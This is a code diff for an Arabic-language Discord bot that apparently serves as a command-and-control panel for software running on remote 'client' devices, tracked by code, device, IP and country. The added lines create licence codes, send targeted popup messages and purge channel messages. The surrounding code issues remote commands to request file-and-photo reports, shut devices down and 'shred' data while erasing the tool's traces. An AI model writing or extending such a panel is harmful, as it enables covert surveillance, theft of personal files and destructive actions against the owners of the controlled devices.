@@ -164,6 +164,22 @@ class CodesSubMenuView(discord.ui.View):
         view = BlacklistManagementView(b_codes)
         await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف):**", view=view, ephemeral=True)
 
+    @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
+    async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if not db:
+            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
+            return
+        if "codes" not in db:
+            db["codes"] = {}
+        new_code = generate_random_code()
+        db["codes"][new_code] = {"used": False, "device": None, "ip": None, "country": None}
+        if save_db(db, sha, url, headers, f"Quick generated code {new_code}"):
+            await interaction.followup.send(f"✨ **تم توليد وحفظ كود جديد بنجاح!**\n🔑 الكود: `{new_code}`", ephemeral=True)
+        else:
+            await interaction.followup.send("❌ فشل حفظ الكود في غيت هب.", ephemeral=True)
+
 
 class UnusedManagementView(discord.ui.View):
     def __init__(self, unused_codes):
@@ -308,6 +324,10 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Request files report for {self.code}"):
                 await interaction.followup.send("📸 تم طلب تقرير الملفات والصور، سيصلك الملف المرفق هنا خلال لحظات!", ephemeral=True)
 
+    @discord.ui.button(label="💬 إرسال رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=2)
+    async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(SendMsgModal(self.code))
+
     @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=2)
     async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
@@ -318,7 +338,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
                 await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري لجهاز العميل!", ephemeral=True)
 
-    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=2)
+    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=3)
     async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -327,6 +347,23 @@ class DeviceActionsView(discord.ui.View):
             db["remote_shreds"][self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Shred {self.code}"):
                 await interaction.followup.send("🔥 تم إرسال أمر التدمير الشامل وحذف أثر الأداة!", ephemeral=True)
+
+
+class SendMsgModal(discord.ui.Modal, title="إرسال رسالة تحذيرية للعميل"):
+    message_content = discord.ui.TextInput(label="نص الرسالة", style=discord.TextStyle.paragraph, placeholder="اكتب الرسالة التي ستظهر للعميل...")
+
+    def __init__(self, code):
+        super().__init__()
+        self.code = code
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "targeted_messages" not in db: db["targeted_messages"] = {}
+            db["targeted_messages"][self.code] = {"msg": str(self.message_content), "id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Send message to {self.code}"):
+                await interaction.followup.send(f"💬 تم إرسال الرسالة إلى العميل بنجاح!", ephemeral=True)
 
 
 class MainDashboardView(discord.ui.View):
@@ -358,7 +395,7 @@ class MainDashboardView(discord.ui.View):
                 return
 
             view = DevicesSubMenuView(devices_list)
-            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
+            await interaction.response.send_message("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ حدث خطأ غير متوقع: {str(e)}", ephemeral=True)
 
@@ -526,6 +563,19 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
     await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)
+
+
+@client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
+@app_commands.describe(amount="عدد الرسائل المراد مسحها (افتراضي 10)")
+async def clear_messages(interaction: discord.Interaction, amount: int = 10):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    deleted = await interaction.channel.purge(limit=amount)
+    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة بنجاح!", ephemeral=True)
+    await asyncio.sleep(3)
+    try:
+        await interaction.delete_original_response()
+    except Exception:
+        pass
 
 
 @client.tree.command(name="sync", description="مزامنة الأوامر")
